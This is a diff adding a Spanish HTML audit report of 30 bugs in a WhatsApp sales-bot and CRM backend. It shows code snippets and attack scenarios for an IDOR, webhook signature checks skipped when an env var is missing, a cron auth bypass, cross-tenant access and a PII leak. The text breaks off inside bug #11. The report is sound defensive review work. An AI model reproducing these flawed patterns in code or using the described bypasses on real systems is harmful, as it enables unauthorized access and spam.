@@ -1,0 +1,1124 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Paula W19 — 30 Bugs Más Graves</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: 'SF Mono', 'Fira Code', 'Consolas', monospace; background: #0a0a0f; color: #e0e0e0; padding: 20px; }
+
+  .header { text-align: center; padding: 40px 20px; border-bottom: 2px solid #1a1a2e; margin-bottom: 30px; }
+  .header h1 { font-size: 2.2rem; color: #ff4757; margin-bottom: 8px; }
+  .header .subtitle { color: #747d8c; font-size: 0.95rem; }
+
+  .stats { display: flex; gap: 16px; justify-content: center; margin: 20px 0 30px; flex-wrap: wrap; }
+  .stat { background: #1a1a2e; padding: 12px 24px; border-radius: 8px; text-align: center; min-width: 120px; }
+  .stat .num { font-size: 1.8rem; font-weight: bold; }
+  .stat .label { font-size: 0.75rem; color: #747d8c; text-transform: uppercase; letter-spacing: 1px; }
+  .stat.critical .num { color: #ff4757; }
+  .stat.high .num { color: #ff6b35; }
+  .stat.total .num { color: #ffa502; }
+
+  .toc { background: #12121f; border: 1px solid #1a1a2e; border-radius: 10px; padding: 24px; margin-bottom: 30px; }
+  .toc h2 { color: #ffa502; margin-bottom: 12px; font-size: 1.1rem; }
+  .toc-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(420px, 1fr)); gap: 6px; }
+  .toc a { color: #7c8aff; text-decoration: none; font-size: 0.82rem; display: block; padding: 4px 8px; border-radius: 4px; transition: background 0.2s; }
+  .toc a:hover { background: #1a1a2e; color: #a0aaff; }
+  .toc .sev { display: inline-block; width: 18px; height: 18px; border-radius: 50%; text-align: center; line-height: 18px; font-size: 0.65rem; font-weight: bold; margin-right: 6px; vertical-align: middle; }
+  .toc .sev.c { background: #ff4757; color: #fff; }
+  .toc .sev.h { background: #ff6b35; color: #fff; }
+
+  .bug { background: #12121f; border: 1px solid #1a1a2e; border-radius: 10px; margin-bottom: 20px; overflow: hidden; transition: border-color 0.3s; }
+  .bug:hover { border-color: #2a2a4e; }
+  .bug.critical { border-left: 4px solid #ff4757; }
+  .bug.high { border-left: 4px solid #ff6b35; }
+
+  .bug-header { display: flex; align-items: center; gap: 12px; padding: 16px 20px; background: #161625; cursor: pointer; user-select: none; }
+  .bug-header:hover { background: #1a1a30; }
+  .bug-num { font-size: 1.1rem; font-weight: bold; color: #ffa502; min-width: 36px; }
+  .bug-title { flex: 1; font-size: 0.95rem; color: #e0e0e0; font-weight: 600; }
+  .badge { padding: 3px 10px; border-radius: 20px; font-size: 0.7rem; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
+  .badge.critical { background: #ff475720; color: #ff4757; border: 1px solid #ff475740; }
+  .badge.high { background: #ff6b3520; color: #ff6b35; border: 1px solid #ff6b3540; }
+  .badge-file { background: #7c8aff15; color: #7c8aff; border: 1px solid #7c8aff30; padding: 3px 8px; border-radius: 12px; font-size: 0.68rem; margin-left: 8px; }
+  .chevron { color: #747d8c; font-size: 1.2rem; transition: transform 0.3s; }
+  .bug.open .chevron { transform: rotate(90deg); }
+
+  .bug-body { padding: 0 20px 20px; display: none; }
+  .bug.open .bug-body { display: block; }
+
+  .section { margin-top: 16px; }
+  .section-title { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1.5px; color: #ffa502; margin-bottom: 8px; font-weight: bold; }
+  .section p { font-size: 0.88rem; line-height: 1.6; color: #b0b0c0; }
+
+  .code-block { background: #0d0d18; border: 1px solid #1a1a2e; border-radius: 6px; padding: 14px 16px; margin: 10px 0; font-size: 0.82rem; line-height: 1.5; overflow-x: auto; color: #c8d6e5; white-space: pre; }
+  .code-block .comment { color: #636e72; }
+  .code-block .keyword { color: #ff6b81; }
+  .code-block .string { color: #7bed9f; }
+  .code-block .highlight { background: #ff475720; display: inline; border-radius: 2px; padding: 0 4px; }
+
+  .scenario { background: #1a0a0a; border: 1px solid #ff475730; border-radius: 6px; padding: 14px 16px; margin: 10px 0; }
+  .scenario::before { content: '⚡ ESCENARIO'; font-size: 0.7rem; color: #ff4757; font-weight: bold; letter-spacing: 1px; display: block; margin-bottom: 6px; }
+  .scenario p { font-size: 0.85rem; color: #e0a0a0; line-height: 1.5; }
+
+  .file-ref { color: #7c8aff; font-size: 0.8rem; margin-top: 8px; }
+  .file-ref code { background: #1a1a2e; padding: 2px 8px; border-radius: 4px; }
+
+  .module-header { background: linear-gradient(135deg, #1a1a2e, #12121f); padding: 20px 24px; border-radius: 10px; margin: 40px 0 20px; border: 1px solid #2a2a4e; }
+  .module-header h2 { color: #ffa502; font-size: 1.2rem; }
+  .module-header .desc { color: #747d8c; font-size: 0.85rem; margin-top: 4px; }
+
+  .footer { text-align: center; padding: 40px; color: #747d8c; font-size: 0.8rem; border-top: 1px solid #1a1a2e; margin-top: 40px; }
+
+  .expand-all { background: #1a1a2e; color: #7c8aff; border: 1px solid #7c8aff30; padding: 8px 20px; border-radius: 6px; cursor: pointer; font-family: inherit; font-size: 0.85rem; margin: 0 8px; }
+  .expand-all:hover { background: #7c8aff20; }
+  .controls { text-align: center; margin-bottom: 20px; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>PAULA W19 — AUDIT DE BUGS</h1>
+  <div class="subtitle">WhatsApp · CRM · Ventas · Crons · Frontend — 30 bugs más graves | 09 abril 2026</div>
+</div>
+
+<div class="stats">
+  <div class="stat critical"><div class="num">10</div><div class="label">Critical</div></div>
+  <div class="stat high"><div class="num">20</div><div class="label">High</div></div>
+  <div class="stat total"><div class="num">30</div><div class="label">Total</div></div>
+</div>
+
+<div class="controls">
+  <button class="expand-all" onclick="toggleAll(true)">▶ Expandir todos</button>
+  <button class="expand-all" onclick="toggleAll(false)">◀ Colapsar todos</button>
+  <button class="expand-all" onclick="filterSev('critical')">Solo Critical</button>
+  <button class="expand-all" onclick="filterSev('high')">Solo High</button>
+  <button class="expand-all" onclick="filterSev('all')">Todos</button>
+</div>
+
+<div class="toc">
+  <h2>ÍNDICE RÁPIDO</h2>
+  <div class="toc-grid">
+    <a href="#bug1"><span class="sev c">C</span>#1 — Optimistic lock SIEMPRE falla → datos descartados silenciosamente</a>
+    <a href="#bug2"><span class="sev c">C</span>#2 — Twilio HMAC deshabilitado cuando env var falta</a>
+    <a href="#bug3"><span class="sev c">C</span>#3 — IDOR: send-message sin verificar dueño de client_id</a>
+    <a href="#bug4"><span class="sev c">C</span>#4 — Kanban vacío para usuarios no-admin</a>
+    <a href="#bug5"><span class="sev c">C</span>#5 — Web form submit público sin rate limiting</a>
+    <a href="#bug6"><span class="sev c">C</span>#6 — Trial activation sin transacción → estado inconsistente</a>
+    <a href="#bug7"><span class="sev c">C</span>#7 — webFormsCrud sin scoping multi-tenant</a>
+    <a href="#bug8"><span class="sev c">C</span>#8 — Crédito deducido DESPUÉS de enviar mensaje (abandoned cart)</a>
+    <a href="#bug9"><span class="sev c">C</span>#9 — onboarding-wa abierto cuando CRON_SECRET no existe</a>
+    <a href="#bug10"><span class="sev c">C</span>#10 — merchant-upsell: SELECT sin `id` → métricas siempre vacías</a>
+    <a href="#bug11"><span class="sev h">H</span>#11 — PII leak: tarjeta de crédito en last_message_preview</a>
+    <a href="#bug12"><span class="sev h">H</span>#12 — Meeting detection "skip" no funciona realmente</a>
+    <a href="#bug13"><span class="sev h">H</span>#13 — Timezone Chile mal calculado → reuniones rechazadas</a>
+    <a href="#bug14"><span class="sev h">H</span>#14 — Segmento de campaña es un no-op → envía a TODOS</a>
+    <a href="#bug15"><span class="sev h">H</span>#15 — Status callback sin validación Twilio HMAC</a>
+    <a href="#bug16"><span class="sev h">H</span>#16 — Metadata sobrescrito → campaign_id destruido</a>
+    <a href="#bug17"><span class="sev h">H</span>#17 — Rate limiter en memoria no funciona entre instancias</a>
+    <a href="#bug18"><span class="sev h">H</span>#18 — admin_notes sobrescribe en vez de agregar</a>
+    <a href="#bug19"><span class="sev h">H</span>#19 — Password temporal en texto plano en wa_messages</a>
+    <a href="#bug20"><span class="sev h">H</span>#20 — Trial: WA falla → 500 pero DB ya cambió → retry bloqueado</a>
+    <a href="#bug21"><span class="sev h">H</span>#21 — Phone normalization ausente en web forms → duplicados</a>
+    <a href="#bug22"><span class="sev h">H</span>#22 — verifyProspectOwnership: cross-tenant access a prospects</a>
+    <a href="#bug23"><span class="sev h">H</span>#23 — Resurrection WA ignora opt-out → ban de Twilio</a>
+    <a href="#bug24"><span class="sev h">H</span>#24 — total_sent no atómico → contador mal en abandoned cart</a>
+    <a href="#bug25"><span class="sev h">H</span>#25 — Email nurture sin mecanismo real de unsubscribe</a>
+    <a href="#bug26"><span class="sev h">H</span>#26 — Sin rate limiting cross-cron → spam WA al mismo merchant</a>
+    <a href="#bug27"><span class="sev h">H</span>#27 — Booking: catch vacío swallow FreeBusy → double-booking</a>
+    <a href="#bug28"><span class="sev h">H</span>#28 — OAuth state usado para nombre, sin CSRF token</a>
+    <a href="#bug29"><span class="sev h">H</span>#29 — ProspectKanban.delete bypasses backend auth</a>
+    <a href="#bug30"><span class="sev h">H</span>#30 — XSS via redirect_url en web forms</a>
+  </div>
+</div>
+
+<!-- ==================== MODULE: WHATSAPP CHAT ==================== -->
+<div class="module-header">
+  <h2>MÓDULO: WhatsApp Chat (steve-wa-chat.ts + send-message + send-campaign + status-callback)</h2>
+  <div class="desc">El core del bot vendedor. 55KB de lógica, multi-brain pipeline, Twilio.</div>
+</div>
+
+<!-- BUG 1 -->
+<div id="bug1" class="bug critical">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#1</span>
+    <span class="bug-title">Optimistic lock SIEMPRE falla → lead score, stage y extracción descartados silenciosamente</span>
+    <span class="badge critical">CRITICAL</span>
+    <span class="badge-file">steve-wa-chat.ts:1360</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>El optimistic lock usa <code>.eq('updated_at', prospect.updated_at)</code> pero el prospect ya fue actualizado ANTES en el mismo request (línea 541-560). El <code>updated_at</code> en memoria es STALE. La comparación NUNCA matchea para prospectos que ya existen. Resultado: lead scoring, stage progression, pain points, budget — todo silenciosamente descartado.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// Línea 541-560: UPDATE prospect → cambia updated_at en DB</span>
+await supabase.from('wa_prospects').update({
+  message_count: newCount,
+  updated_at: <span class="highlight">new Date().toISOString()</span>  <span class="comment">// ← DB ahora tiene "2026-04-09T14:30:00Z"</span>
+}).eq('id', prospect.id);
+
+<span class="comment">// Línea 1360-1364: processProspectAsync intenta guardar extracción</span>
+await supabase.from('wa_prospects').update(updatePayload)
+  .eq('id', prospect.id)
+  .eq('updated_at', <span class="highlight">prospect.updated_at</span>);  <span class="comment">// ← Sigue usando "2026-04-08T10:00:00Z" (STALE)</span>
+<span class="comment">// → 0 rows affected. Lead score, pain_points, budget = PERDIDOS.</span></div>
+    </div>
+    <div class="scenario">
+      <p>Prospect existente envía mensaje. Se carga con updated_at="10:00". Línea 543 lo cambia a "14:30" en DB. Después, processProspectAsync extrae pain_points, calcula lead_score=85, detecta budget=$5000. Intenta guardar con <code>.eq('updated_at', '10:00')</code> → no matchea → 0 rows updated. Todos los datos valiosos se pierden. Esto pasa en CADA mensaje de CADA prospect existente.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 2 -->
+<div id="bug2" class="bug critical">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#2</span>
+    <span class="bug-title">Twilio HMAC deshabilitado silenciosamente cuando env var falta</span>
+    <span class="badge critical">CRITICAL</span>
+    <span class="badge-file">steve-wa-chat.ts:253</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>La validación Twilio HMAC está envuelta en <code>if (twilioAuthToken)</code>. Si <code>TWILIO_AUTH_TOKEN</code> se pierde en un deploy (ya ha pasado según MEMORY.md), toda la validación se desactiva. Cualquier persona puede enviar webhooks falsos, crear prospects, y quemar créditos de Anthropic.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="keyword">const</span> twilioAuthToken = process.env.TWILIO_AUTH_TOKEN;
+
+<span class="keyword">if</span> (<span class="highlight">twilioAuthToken</span>) {  <span class="comment">// ← Si es undefined, TODO el bloque se salta</span>
+  <span class="comment">// ... validación HMAC ...</span>
+  <span class="keyword">const</span> isValid = validateRequest(twilioAuthToken, signature, fullUrl, params);
+  <span class="keyword">if</span> (!isValid) <span class="keyword">return</span> c.text(<span class="string">'Forbidden'</span>, 403);
+}
+<span class="comment">// Si twilioAuthToken es falsy → CERO validación → cualquiera puede POST</span></div>
+    </div>
+    <div class="scenario">
+      <p>Deploy con <code>--set-env-vars</code> (prohibido, pero accidental). TWILIO_AUTH_TOKEN se borra. Atacante descubre la URL del webhook. Envía <code>From=whatsapp:+56912345678&Body=hola</code>. Steve responde con IA, crea prospect, quema tokens de Claude. Costo: ilimitado.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 3 -->
+<div id="bug3" class="bug critical">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#3</span>
+    <span class="bug-title">IDOR: send-message y send-campaign sin verificar ownership de client_id</span>
+    <span class="badge critical">CRITICAL</span>
+    <span class="badge-file">send-message.ts:17 / send-campaign.ts:18</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>Ambos endpoints aceptan <code>client_id</code> del body sin verificar que el usuario autenticado sea dueño. Cualquier usuario autenticado puede enviar mensajes o lanzar campañas como cualquier otro merchant, usando SU cuenta Twilio y SUS créditos.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// send-message.ts línea 17-20</span>
+<span class="keyword">const</span> { client_id, to_phone, body: msgBody } = <span class="keyword">await</span> c.req.json();
+
+<span class="comment">// ← NUNCA verifica que el JWT del usuario corresponda a client_id</span>
+<span class="comment">// ← Cualquier user autenticado puede mandar mensajes como client_id = "OTRO_MERCHANT"</span>
+
+<span class="keyword">const</span> { data: account } = <span class="keyword">await</span> supabase
+  .from(<span class="string">'wa_twilio_accounts'</span>)
+  .select(<span class="string">'*'</span>)
+  .eq(<span class="string">'client_id'</span>, <span class="highlight">client_id</span>)  <span class="comment">// ← usa el client_id sin validar</span>
+  .single();</div>
+    </div>
+    <div class="scenario">
+      <p>Usuario A (client_id=AAA) se autentica y envía <code>{ client_id: "BBB", to_phone: "+1234567890", body: "spam" }</code>. El servidor envía un WhatsApp desde la cuenta Twilio del merchant B, cobra créditos al merchant B. Merchant B no sabe nada.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 4 -->
+<div id="bug4" class="bug critical">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#4</span>
+    <span class="bug-title">Kanban VACÍO para todos los usuarios no-admin</span>
+    <span class="badge critical">CRITICAL</span>
+    <span class="badge-file">prospect-crm.ts:246</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>Para usuarios no-admin, el Kanban filtra prospects con <code>.in('converted_client_id', clientIds)</code>. Pero los prospects en stages activos (new, discovery, qualifying, pitching, closing) tienen <code>converted_client_id = NULL</code> — aún no están convertidos. Resultado: Kanban 100% vacío para vendedores.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// prospect-crm.ts línea 246</span>
+<span class="keyword">if</span> (!isSuperAdmin) {
+  query = query.in(<span class="string">'converted_client_id'</span>, <span class="highlight">clientIds</span>);
+  <span class="comment">// ← Prospects en "new", "qualifying", "pitching" tienen converted_client_id = NULL</span>
+  <span class="comment">// ← NULL nunca está IN(...) → 0 resultados → Kanban vacío</span>
+}</div>
+    </div>
+    <div class="scenario">
+      <p>Un vendedor (no-admin) abre el Kanban. Tiene 15 prospects en su pipeline (new, qualifying, pitching). Ve un tablero completamente vacío. Solo vería prospects ya convertidos (que ya no deberían estar en el pipeline). El módulo de ventas es inútil para vendedores.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 5 -->
+<div id="bug5" class="bug critical">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#5</span>
+    <span class="bug-title">Web form submit público sin rate limiting → flood de prospects y WA spam</span>
+    <span class="badge critical">CRITICAL</span>
+    <span class="badge-file">web-forms.ts:94</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p><code>webFormSubmit</code> es un endpoint público (sin auth, sin rate limit, sin CAPTCHA). Un bot puede enviar miles de submissions por minuto, creando miles de prospects, disparando miles de notificaciones WhatsApp al admin, y llenando la DB de basura.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// web-forms.ts — endpoint público, sin protección</span>
+<span class="keyword">export async function</span> webFormSubmit(c: Context) {
+  <span class="comment">// ← NO hay rate limiting</span>
+  <span class="comment">// ← NO hay CAPTCHA</span>
+  <span class="comment">// ← NO hay honeypot</span>
+  <span class="keyword">const</span> body = <span class="keyword">await</span> c.req.json();
+  <span class="comment">// ... crea prospect, envía WA al admin ...</span>
+}</div>
+    </div>
+    <div class="scenario">
+      <p>Bot envía 10,000 submissions en 1 minuto. Cada una crea un prospect en <code>wa_prospects</code>, una fila en <code>web_form_submissions</code>, y envía un WhatsApp al admin. El admin recibe 10,000 mensajes de WA. Twilio cobra por cada uno. La DB se llena de basura. Pipeline de ventas inservible.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 6 -->
+<div id="bug6" class="bug critical">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#6</span>
+    <span class="bug-title">Trial activation sin transacción → usuario zombie si falla a medio camino</span>
+    <span class="badge critical">CRITICAL</span>
+    <span class="badge-file">prospect-trial.ts:34-114</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>La activación de trial ejecuta 6 pasos secuenciales (crear auth user, asignar rol, crear client, actualizar prospect, seed onboarding, enviar WA) SIN transacción. Si falla en paso 3+, el auth user ya existe pero no tiene client/rol. Retry devuelve 409 "User already exists". Usuario atrapado.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// prospect-trial.ts — 6 pasos sin transacción</span>
+<span class="comment">// Paso 1: createUser → ✅ (auth user creado, irreversible)</span>
+<span class="keyword">const</span> { data: authUser } = <span class="keyword">await</span> supabase.auth.admin.createUser({...});
+
+<span class="comment">// Paso 2: assignRole → ✅</span>
+<span class="keyword">await</span> supabase.from(<span class="string">'user_roles'</span>).insert({...});
+
+<span class="comment">// Paso 3: createClient → <span class="highlight">❌ FALLA AQUÍ</span></span>
+<span class="keyword">await</span> supabase.from(<span class="string">'clients'</span>).insert({...});
+<span class="comment">// → Auth user existe, tiene rol, pero NO tiene client</span>
+<span class="comment">// → Puede hacer login pero la app crashea al buscar client</span>
+<span class="comment">// → Retry del trial: "409 User already exists"</span>
+<span class="comment">// → STUCK FOREVER</span></div>
+    </div>
+    <div class="scenario">
+      <p>Prospect listo para trial. Paso 1 (crear user) OK. Paso 3 (crear client) falla por constraint violation. El user existe en auth pero no tiene client record. Puede hacer login pero la app explota al no encontrar client. Retrying devuelve 409. El prospect nunca puede usar la plataforma y no puede re-registrarse.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 7 -->
+<div id="bug7" class="bug critical">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#7</span>
+    <span class="bug-title">webFormsCrud sin scoping multi-tenant → CRUD total cross-tenant</span>
+    <span class="badge critical">CRITICAL</span>
+    <span class="badge-file">web-forms.ts:10-88</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>A diferencia de TODOS los otros endpoints CRM que usan <code>getUserClientIds</code>, <code>webFormsCrud</code> tiene CERO scoping. Cualquier usuario autenticado puede: listar TODOS los formularios de TODOS los tenants, leer, actualizar y eliminar formularios ajenos.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="keyword">export async function</span> webFormsCrud(c: Context) {
+  <span class="keyword">const</span> user = c.get(<span class="string">'user'</span>);
+  <span class="comment">// ← NO llama getUserClientIds()</span>
+  <span class="comment">// ← NO verifica isSuperAdmin</span>
+  <span class="comment">// ← NO scoping por tenant</span>
+
+  <span class="keyword">if</span> (action === <span class="string">'list'</span>) {
+    <span class="keyword">const</span> { data } = <span class="keyword">await</span> supabase
+      .from(<span class="string">'web_forms'</span>).select(<span class="string">'*'</span>);  <span class="comment">// ← TODOS los forms de TODOS los tenants</span>
+  }
+
+  <span class="keyword">if</span> (action === <span class="string">'delete'</span>) {
+    <span class="keyword">await</span> supabase.from(<span class="string">'web_forms'</span>)
+      .delete().eq(<span class="string">'id'</span>, form_id);  <span class="comment">// ← Puede borrar el form de CUALQUIER tenant</span>
+  }
+}</div>
+    </div>
+    <div class="scenario">
+      <p>Tenant B lista formularios y ve el formulario de captación de leads de Tenant A. Lo edita para cambiar el redirect_url a un sitio malicioso. Prospects de Tenant A son redirigidos al sitio de Tenant B. O simplemente lo borra y todas las submissions se pierden.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 8 -->
+<div id="bug8" class="bug critical">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#8</span>
+    <span class="bug-title">Crédito deducido DESPUÉS de enviar mensaje → duplicados en abandoned cart</span>
+    <span class="badge critical">CRITICAL</span>
+    <span class="badge-file">abandoned-cart-wa.ts:141-158</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>El mensaje Twilio se envía PRIMERO (irreversible), y DESPUÉS se deduce el crédito. Si la deducción falla, el código hace <code>continue</code> pero el mensaje YA salió. Peor: <code>wa_reminder_sent</code> nunca se marca <code>true</code>, así que el próximo cron envía el MISMO mensaje de nuevo.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// Línea 141: ENVÍO IRREVERSIBLE</span>
+<span class="keyword">await</span> twilioClient.messages.create({
+  to: <span class="string">`whatsapp:${toNumber}`</span>,
+  from: <span class="string">`whatsapp:${fromNumber}`</span>,
+  body: reminderBody
+});
+<span class="comment">// ← Mensaje YA fue enviado y cobrado por Twilio</span>
+
+<span class="comment">// Línea 148: INTENTA deducir crédito</span>
+<span class="keyword">const</span> { error: creditError } = <span class="keyword">await</span> supabase.rpc(<span class="string">'deduct_wa_credit'</span>, {...});
+<span class="keyword">if</span> (creditError) {
+  <span class="highlight">skipped++; continue;</span>  <span class="comment">// ← Mensaje enviado pero crédito NO deducido</span>
+  <span class="comment">// ← wa_reminder_sent NUNCA se pone true</span>
+  <span class="comment">// ← Próximo cron: re-envía el mismo mensaje</span>
+}</div>
+    </div>
+    <div class="scenario">
+      <p>Carrito #123 abandonado. Cron envía WA al cliente (cobro Twilio). <code>deduct_wa_credit</code> falla por DB timeout. <code>wa_reminder_sent</code> queda false. Próxima hora: cron encuentra carrito #123 de nuevo, envía otro WA. Repite indefinidamente. Cliente recibe 24 mensajes iguales al día.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 9 -->
+<div id="bug9" class="bug critical">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#9</span>
+    <span class="bug-title">onboarding-wa abierto a Internet cuando CRON_SECRET no está seteado</span>
+    <span class="badge critical">CRITICAL</span>
+    <span class="badge-file">onboarding-wa.ts:18-21</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>A diferencia de los otros crons que hacen <code>!expected || secret !== expected</code>, este hace <code>cronSecret !== process.env.CRON_SECRET</code> directo. Si <code>CRON_SECRET</code> no existe, ambos son <code>undefined</code>, y <code>undefined !== undefined</code> es <code>false</code> → auth bypassed. Endpoint abierto.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// onboarding-wa.ts — TODOS los otros crons:</span>
+<span class="keyword">const</span> expected = process.env.CRON_SECRET;
+<span class="keyword">if</span> (<span class="highlight">!expected</span> || secret !== expected) <span class="keyword">return</span> c.text(<span class="string">'Unauthorized'</span>, 401);
+
+<span class="comment">// onboarding-wa.ts — ESTE cron:</span>
+<span class="keyword">if</span> (cronSecret !== process.env.CRON_SECRET) {  <span class="comment">// ← Si CRON_SECRET=undefined...</span>
+  <span class="comment">// undefined !== undefined = false → NO entra al if → AUTH BYPASSED</span>
+  <span class="keyword">return</span> c.json({ error: <span class="string">'Unauthorized'</span> }, 401);
+}</div>
+    </div>
+    <div class="scenario">
+      <p>Deploy accidental borra CRON_SECRET. Todos los otros crons devuelven 401 (<code>!expected</code> lo atrapa). Pero <code>onboarding-wa</code> queda abierto. Cualquiera puede hacer POST y disparar mensajes de onboarding WA a TODOS los merchants.</p>
+    </div>
+  </div>
+</div>
+
+<!-- BUG 10 -->
+<div id="bug10" class="bug critical">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#10</span>
+    <span class="bug-title">merchant-upsell: SELECT sin `id` → platform_metrics siempre vacío → upsell muerto</span>
+    <span class="badge critical">CRITICAL</span>
+    <span class="badge-file">merchant-upsell.ts:62,76</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>El SELECT de platform_connections pide <code>'platform, is_active'</code> pero NO incluye <code>id</code>. Luego <code>connections.map(c => c.id)</code> retorna <code>[undefined, undefined]</code>. <code>.filter(Boolean)</code> lo limpia a <code>[]</code>. La query a <code>platform_metrics</code> con <code>.in('connection_id', [])</code> retorna 0 resultados. <code>totalRevenue</code> siempre es 0. El upsell de upgrade_plan NUNCA se dispara.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// Línea 62: SELECT sin 'id'</span>
+<span class="keyword">const</span> { data: connections } = <span class="keyword">await</span> supabase
+  .from(<span class="string">'platform_connections'</span>)
+  .select(<span class="string">'<span class="highlight">platform, is_active</span>'</span>)  <span class="comment">// ← Falta 'id'</span>
+  .eq(<span class="string">'client_id'</span>, client.id);
+
+<span class="comment">// Línea 76:</span>
+<span class="keyword">const</span> connIds = connections.map((c: any) => <span class="highlight">c.id</span>).filter(Boolean);
+<span class="comment">// c.id = undefined porque 'id' no está en el SELECT</span>
+<span class="comment">// .filter(Boolean) → [] (array vacío)</span>
+
+<span class="keyword">const</span> { data: metrics } = <span class="keyword">await</span> supabase
+  .from(<span class="string">'platform_metrics'</span>)
+  .select(<span class="string">'revenue'</span>)
+  .in(<span class="string">'connection_id'</span>, <span class="highlight">connIds</span>);  <span class="comment">// → .in('connection_id', []) → 0 results</span>
+<span class="comment">// totalRevenue = 0 SIEMPRE → upgrade_plan upsell NUNCA se crea</span></div>
+    </div>
+    <div class="scenario">
+      <p>Merchant genera $10M/mes en revenue. Está en plan starter. El cron de upsell corre cada domingo. Busca métricas con <code>connection_id IN ()</code> → 0 results → totalRevenue=0 → "no necesita upgrade". El merchant más grande de la plataforma nunca recibe sugerencia de upgrade. Fix: cambiar SELECT a <code>'id, platform, is_active'</code>.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ==================== MODULE: HIGH SEVERITY ==================== -->
+<div class="module-header">
+  <h2>BUGS HIGH — 20 bugs de severidad alta</h2>
+  <div class="desc">Seguridad, data loss, compliance, UX roto</div>
+</div>
+
+<!-- BUG 11 -->
+<div id="bug11" class="bug high">
+  <div class="bug-header" onclick="this.parentElement.classList.toggle('open')">
+    <span class="bug-num">#11</span>
+    <span class="bug-title">PII leak: número de tarjeta de crédito guardado en last_message_preview</span>
+    <span class="badge high">HIGH</span>
+    <span class="badge-file">steve-wa-chat.ts:383</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="bug-body">
+    <div class="section">
+      <div class="section-title">Qué pasa</div>
+      <p>La conversation upsert usa <code>messageBody.substring(0, 100)</code> (mensaje ORIGINAL) para <code>last_message_preview</code>, en vez de <code>storageBody</code> (versión PII-scrubbed). Si el prospect envía un número de tarjeta, aparece en texto plano en <code>wa_conversations</code> aunque en <code>wa_messages</code> está redactado.</p>
+    </div>
+    <div class="section">
+      <div class="section-title">Código problema</div>
+      <div class="code-block"><span class="comment">// storageBody tiene PII scrubbed: "[REDACTED]"</span>
+<span class="comment">// messageBody tiene el texto original: "mi tarjeta es 4532-1234-5678-9012"</span>
+
+<span class="keyword">await</span> supabase.from(<span class="string">'wa_conversations'</span>).upsert({
+  last_message_preview: <span class="highlight">messageBody</span>.substring(0, 100),  <span class="comment">// ← ORIGINAL, no scrubbed</span>
+  <span class="comment">// Debería ser: storageBody.substring(0, 100)</span>
+});</div>
+    </div>
+    <div class="scenario">
